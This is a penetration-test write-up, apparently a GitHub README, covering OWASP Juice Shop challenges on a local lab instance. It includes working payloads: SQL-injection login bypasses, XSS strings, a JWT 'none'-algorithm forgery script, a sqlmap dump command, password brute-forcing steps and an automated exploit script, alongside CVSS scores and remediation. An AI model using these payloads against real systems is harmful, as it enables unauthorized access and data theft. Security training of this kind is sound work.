# 🧃 OWASP Juice Shop — Web Application Penetration Testing

> A structured, professional penetration test of OWASP Juice Shop covering **40+ challenges** across all OWASP Top 10 vulnerability categories. Documented with CVSS scoring, proof-of-concept payloads, and remediation guidance.

![Platform](https://img.shields.io/badge/Platform-Kali%20Linux-557C94?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-Burp%20Suite-orange?style=flat-square)
![Juice Shop](https://img.shields.io/badge/Juice%20Shop-v17.3.0-brightgreen?style=flat-square)
![Challenges](https://img.shields.io/badge/Challenges%20-40%2B-critical?style=flat-square)
![License](https://img.shields.io/badge/Use-Educational%20Only-blue?style=flat-square)

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Environment Setup](#-environment-setup)
- [Tools Used](#-tools-used)
- [Methodology](#-methodology)
- [Vulnerability Categories & Challenges](#-vulnerability-categories--challenges)
  - [A01 — Broken Access Control](#a01--broken-access-control)
  - [A02 — Cryptographic Failures](#a02--cryptographic-failures)
  - [A03 — Injection (SQLi & XSS)](#a03--injection-sqli--xss)
  - [A05 — Security Misconfiguration](#a05--security-misconfiguration)
  - [A07 — Authentication Failures](#a07--authentication-failures)
  - [A08 — Software Integrity Failures](#a08--software-integrity-failures)
  - [Bonus Challenges](#bonus-challenges)
- [Advanced Exploits](#-advanced-exploits)
- [Key Findings Summary](#-key-findings-summary)
- [Remediation Recommendations](#-remediation-recommendations)
- [Learnings & Takeaways](#-learnings--takeaways)
- [Disclaimer](#-disclaimer)

---

## 🔍 Overview

This project documents a simulated black-box/grey-box penetration test against [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/), an intentionally vulnerable Node.js e-commerce application. Each finding is documented with:

- **Vulnerability class** (mapped to OWASP Top 10 2021)
- **CVSS v3.1 score** (where applicable)
- **Step-by-step proof of concept**
- **Evidence / screenshots**
- **Remediation guidance**

> ⚠️ **Ethical Use Only.** All techniques demonstrated here were performed on a locally-hosted, intentionally vulnerable application. Never use these techniques on systems you do not own or have explicit written permission to test.

---

## 🛠️ Environment Setup

```bash
# 1. Install Docker (if not already installed)
sudo apt update && sudo apt install docker.io -y

# 2. Pull and run Juice Shop
docker pull bkimminich/juice-shop
docker run -d -p 3000:3000 bkimminich/juice-shop

# 3. Access the application
# Open: http://localhost:3000

# 4. Configure Burp Suite proxy
# Burp listener: 127.0.0.1:8080
# Firefox proxy:  127.0.0.1:8080 (HTTP & HTTPS)
# Import Burp CA cert into Firefox for HTTPS interception
```

---

## 🧰 Tools Used

| Tool | Version | Purpose |
|---|---|---|
| OWASP Juice Shop | v17.3.0 | Target application |
| Burp Suite Community | Latest | Proxy, Intruder, Repeater, Decoder |
| Firefox | Latest | Browser with Burp proxy |
| Exiftool | 12.x | Image metadata extraction |
| jwt_tool | Latest | JWT analysis and forgery |
| SQLMap | 1.7.x | Automated SQL injection testing |
| Kali Linux | 2024.x | OS environment |
| rockyou.txt | — | Wordlist for brute-force attacks |

---

## 🔬 Methodology

This engagement followed a structured testing lifecycle:

```
Reconnaissance → Mapping → Vulnerability Discovery → Exploitation → Reporting
```

1. **Passive recon** — Review JS source, robots.txt, sitemap
2. **Active mapping** — Burp Spider + manual endpoint enumeration
3. **Vulnerability testing** — Input fuzzing, auth bypass, privilege escalation
4. **Exploitation** — Targeted payloads for confirmed vulnerabilities
5. **Documentation** — CVSS scoring, PoC, and remediation per finding

---

## 📂 Vulnerability Categories & Challenges

### A01 — Broken Access Control

> Unauthorized access to resources, functions, or data that should be restricted.

#### Challenge: View Another User's Basket (IDOR)
- **CVSS**: 6.5 (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`
- **Description**: Basket IDs are sequential integers, allowing any authenticated user to view another user's cart by manipulating the `bid` parameter.
- **Steps**:
  1. Log in to Juice Shop
  2. Add an item to your basket — intercept in Burp
  3. Observe `GET /rest/basket/1` — change `1` to `2`, `3`, etc.
  4. Response returns another user's full basket contents
- **Evidence**: `screenshots/idor-basket.png`
- **Remediation**: Validate that `basket.userId === req.user.id` server-side on every basket request. Never rely on the client to scope data.

---

#### Challenge: Access the Administration Page
- **CVSS**: 7.5 (High) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- **Description**: The `/administration` route is hidden but accessible to any authenticated user, exposing all customer data and order details.
- **Steps**:
  1. Open DevTools → Sources → search for `administration` in main JS bundle
  2. Navigate directly to `http://localhost:3000/#/administration`
- **Remediation**: Enforce role-based access control (RBAC) — all admin routes must check `req.user.role === 'admin'` server-side.

---

#### Challenge: Access a Confidential Document
- **CVSS**: 5.3 (Medium)
- **Description**: A confidential PDF is accessible via direct URL enumeration.
- **Steps**:
  1. Navigate to `/ftp/` — directory listing is enabled
  2. Download `acquisitions.md` and `package.json.bak`
- **Remediation**: Disable directory listing. Restrict `/ftp/` to authenticated admin users. Store sensitive files outside the web root.

---

### A02 — Cryptographic Failures

#### Challenge: Exif Metadata Leak
- **CVSS**: 4.3 (Medium)
- **Description**: Uploaded user profile photos retain EXIF metadata including GPS coordinates and device information.
- **Steps**:
  ```bash
  # Download the uploaded image, then:
  exiftool profile_upload.jpg
  # Output reveals GPS data, camera model, timestamp
  ```
- **Remediation**: Strip EXIF data server-side using ImageMagick (`mogrify -strip`) or a dedicated library before storing uploads.

---

### A03 — Injection (SQLi & XSS)

#### Challenge: Login as Admin via SQL Injection
- **CVSS**: 9.8 (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Description**: The login endpoint concatenates user input directly into a SQL query with no parameterization.
- **Payload**:
  ```
  Email:    ' OR 1=1--
  Password: anything
  ```
- **Burp Repeater request**:
  ```http
  POST /rest/user/login HTTP/1.1
  Content-Type: application/json

  {"email":"' OR 1=1--","password":"x"}
  ```
- **Evidence**: `screenshots/sqli-admin-login.png`
- **Remediation**: Use parameterized queries or an ORM. Never concatenate user input into SQL. Implement WAF rules as a secondary control.

---

#### Challenge: Login as Jim via SQL Injection
- **CVSS**: 8.8 (High)
- **Description**: Same SQLi vector — targeted at a specific user by enumerating their email via the product review section, then injecting against that email.
- **Payload**:
  ```
  Email:    jim@juice-sh.op'--
  Password: anything
  ```

---

#### Challenge: DOM XSS in Search
- **CVSS**: 6.1 (Medium)
- **Description**: The search parameter is reflected unsanitized into the DOM, enabling script execution.
- **Payload**:
  ```
  http://localhost:3000/#/search?q=<iframe src="javascript:alert('XSS')">
  ```
- **Why it works**: Angular's `bypassSecurityTrustHtml()` is called on unvalidated input.
- **Remediation**: Never use `bypassSecurityTrustHtml`. Use Angular's built-in sanitization. Validate and encode all user-controlled values before DOM insertion.

---

#### Challenge: Persistent XSS via User Registration
- **CVSS**: 8.2 (High)
- **Description**: The "Last Login IP" field displayed in the user profile is stored and rendered without encoding, enabling stored XSS.
- **Payload**:
  ```http
  POST /rest/user/whoami HTTP/1.1
  True-Client-IP: <script>alert('Stored XSS')</script>
  ```
- **Evidence**: `screenshots/stored-xss.png`
- **Remediation**: HTML-encode all user-supplied data before rendering. Apply Content Security Policy (CSP) headers.

---

### A05 — Security Misconfiguration

#### Challenge: Exposed Metrics Endpoint
- **CVSS**: 5.3 (Medium)
- **Description**: `/metrics` exposes Prometheus metrics including internal memory usage, event loop lag, and request counts — valuable for attacker reconnaissance.
- **Steps**: Navigate to `http://localhost:3000/metrics`
- **Remediation**: Restrict `/metrics` to internal network or authenticated monitoring systems only.

---

#### Challenge: Deprecated Interface
- **CVSS**: 5.3 (Medium)
- **Description**: A B2B order XML endpoint remains active and accepts external XML input, opening the door to XXE attacks.
- **Steps**:
  1. Navigate to `/#/b2b` (hidden route found in JS bundle)
  2. Submit XML order payload
- **Remediation**: Decommission deprecated endpoints. If retained, disable external entity processing in the XML parser (`FEATURE_SECURE_PROCESSING`).

---

### A07 — Authentication Failures

#### Challenge: JWT Algorithm Confusion (None Algorithm)
- **CVSS**: 9.1 (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`
- **Description**: The server accepts JWTs with `"alg": "none"`, bypassing signature verification entirely.
- **Steps**:
  1. Capture a valid JWT from any login response
  2. Decode the header+payload (base64)
  3. Modify header to `{"alg":"none","typ":"JWT"}` and payload to `{"data":{"email":"admin@juice-sh.op","role":"admin"}}`
  4. Re-encode without signature: `base64(header).base64(payload).`
  5. Send forged token in `Authorization: Bearer <token>`
- **jwt_tool command**:
  ```bash
  python3 jwt_tool.py <token> -X a
  ```
- **Evidence**: `screenshots/jwt-none-algorithm.png`
- **Remediation**: Explicitly whitelist allowed JWT algorithms server-side (`RS256` or `HS256`). Reject tokens with `alg: none`. Use a hardened JWT library.

---

#### Challenge: Brute-Force Login (Jim)
- **CVSS**: 7.5 (High)
- **Description**: No account lockout or rate limiting on the login endpoint.
- **Steps**:
  1. Identify Jim's email: `jim@juice-sh.op` (visible in product reviews)
  2. Burp Intruder → Sniper attack on `password` field
  3. Wordlist: `/usr/share/wordlists/rockyou.txt`
  4. Filter responses by `200 OK` — match indicates valid credentials
- **Remediation**: Implement rate limiting (e.g., 5 attempts → 15 min lockout). Add CAPTCHA after 3 failures. Alert on credential stuffing patterns.

---

#### Challenge: Change Password Without Knowing Old Password
- **CVSS**: 8.1 (High)
- **Description**: The password change endpoint only validates the old password if the parameter is present. Removing it bypasses the check entirely.
- **Steps**:
  1. Intercept `POST /rest/user/change-password`
  2. Remove the `current` parameter from the request body
  3. Set `new` and `repeat` to desired password — accepted with `200 OK`
- **Remediation**: Server must always require and validate `current` password. Parameter absence must be treated as a validation failure.

---

### A08 — Software Integrity Failures

#### Challenge: Forgotten Developer Backup File
- **CVSS**: 6.5 (Medium)
- **Description**: A `.bak` file containing application source code is accessible in the `/ftp/` directory.
- **Steps**:
  1. Browse to `http://localhost:3000/ftp/`
  2. Download `package.json.bak` — reveals dependency versions and internal scripts
- **Remediation**: Exclude backup files from web-accessible directories via `.gitignore` and deployment pipeline rules.

---

### Bonus Challenges

| # | Challenge | Category | Key Technique |
|---|---|---|---|
| B1 | Captcha Bypass | Weak Validation | Replay valid captcha token via Burp Repeater |
| B2 | Zero-Star Feedback | API Abuse | Remove `rating` validation via Repeater |
| B3 | Forged Feedback | Privilege Escalation | Submit feedback on behalf of another user ID |
| B4 | Open Redirect | Unvalidated Redirect | Modify `to` param after login |
| B5 | Bully Chatbot | Logic Abuse | Trigger hidden coupon via repeated insults |
| B6 | Login With Deleted User | Logic Flaw | Reuse soft-deleted account credentials |
| B7 | Visual XSS | Reflected XSS | Inject script tag into image filename |
| B8 | Password Strength Bypass | Weak Policy | Server accepts passwords client-side rules reject |
| B9 | Privacy Policy | Info Disclosure | Hidden easter egg in privacy document |
| B10 | Score Board | Info Disclosure | Route exposed in Angular routing table |

---

## 🔐 Advanced Exploits

### JWT Forgery (Detailed Walkthrough)

```python
import base64, json

# Step 1: Craft malicious header
header = {"alg": "none", "typ": "JWT"}
payload = {
    "data": {
        "email": "admin@juice-sh.op",
        "role": "admin",
        "id": 1
    },
    "iat": 9999999999
}

def b64_encode(data):
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(',', ':')).encode()
    ).rstrip(b'=').decode()

forged_token = f"{b64_encode(header)}.{b64_encode(payload)}."
print(f"Forged JWT: {forged_token}")
```

---

### SQL Injection Enumeration with SQLMap

```bash
# Capture login request in Burp, save as login.txt, then:
sqlmap -r login.txt \
  --dbms=sqlite \
  --technique=B \
  --level=3 \
  --risk=2 \
  --dump \
  --tables \
  -p email
```

---

### Automated Challenge Solver Script (Python)

```python
import requests

BASE = "http://localhost:3000"

def get_admin_token():
    """Obtain admin JWT via SQLi"""
    r = requests.post(f"{BASE}/rest/user/login", json={
        "email": "' OR 1=1--",
        "password": "x"
    })
    return r.json()["authentication"]["token"]

def access_metrics(token):
    """Access restricted /metrics endpoint"""
    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(f"{BASE}/metrics", headers=headers)
    print(f"[+] Metrics status: {r.status_code}")
    return r.text

if __name__ == "__main__":
    token = get_admin_token()
    print(f"[+] Admin token obtained: {token[:40]}...")
    metrics = access_metrics(token)
    print(metrics[:500])
```

---

## 📊 Key Findings Summary

| Severity | Count | Vulnerability Types |
|---|---|---|
| 🔴 Critical | 2 | SQLi Auth Bypass, JWT None Algorithm |
| 🟠 High | 5 | Stored XSS, Brute Force, JWT Forgery, IDOR, Password Logic Flaw |
| 🟡 Medium | 8 | DOM XSS, Directory Traversal, Metadata Leak, Open Redirect, CSRF |
| 🔵 Low/Info | 8 | Exposed Metrics, Score Board, Deprecated API, Info Disclosure |

**Most Critical Attack Chain:**
```
Enumerate user email (product reviews)
  → SQL injection on login endpoint
    → Obtain admin JWT
      → Access /administration panel
        → Exfiltrate all user data + order history
```

---

## 🛡️ Remediation Recommendations

### Priority 1 — Fix Immediately (Critical/High)

1. **Parameterize all database queries** — eliminate every raw SQL string concatenation
2. **Harden JWT validation** — whitelist `HS256`/`RS256`, reject `alg:none`, rotate secrets
3. **Enforce RBAC on all routes** — server-side role checks, not client-side routing guards
4. **Add rate limiting + account lockout** — max 5 login attempts, exponential backoff

### Priority 2 — Fix Soon (Medium)

5. **Sanitize all DOM output** — no `bypassSecurityTrustHtml`, encode before insert
6. **Strip file metadata server-side** — remove EXIF from all uploaded images
7. **Disable directory listing** — configure web server to return 403 on directory paths
8. **Validate all redirect targets** — allowlist of permitted redirect destinations only

### Priority 3 — Harden (Low/Informational)

9. **Restrict `/metrics`** — internal network or authenticated access only
10. **Apply Content Security Policy** — `Content-Security-Policy: default-src 'self'`
11. **Implement security headers** — `X-Frame-Options`, `X-Content-Type-Options`, `HSTS`
12. **Decommission deprecated endpoints** — remove B2B XML interface or sandbox it

---

## 🎓 Learnings & Takeaways

- **SQL injection is still rampant** — parameterized queries are non-negotiable, not optional
- **JWT "none" algorithm** is a classic misconfiguration that grants full auth bypass in one step
- **IDOR vulnerabilities** are trivially exploitable when object IDs are predictable integers
- **Defense in depth matters** — no single control prevents all attacks; layer them
- **Source code review** (even of minified JS bundles) yields massive attack surface intel
- **Automation with Python + Requests** dramatically speeds up chained exploitation

---

## 📁 Repository Structure

```
juice-shop-pentest/
├── README.md                  # This file
├── report/
│   └── pentest-report.pdf     # Full professional PDF report
├── screenshots/
│   ├── sqli-admin-login.png
│   ├── jwt-none-algorithm.png
│   ├── idor-basket.png
│   ├── stored-xss.png
│   └── ...
├── payloads/
│   ├── sqli-payloads.txt
│   └── xss-payloads.txt
└── scripts/
    ├── auto-solver.py
    └── jwt-forge.py
```

---

## ⚠️ Disclaimer

This project is for **educational purposes only**. All testing was conducted on a locally-hosted, intentionally vulnerable application. The techniques documented here must **never** be used against production systems or any system without explicit written authorization. Unauthorized penetration testing is illegal.

---

*Built for the security community — practice ethically, hack responsibly.*
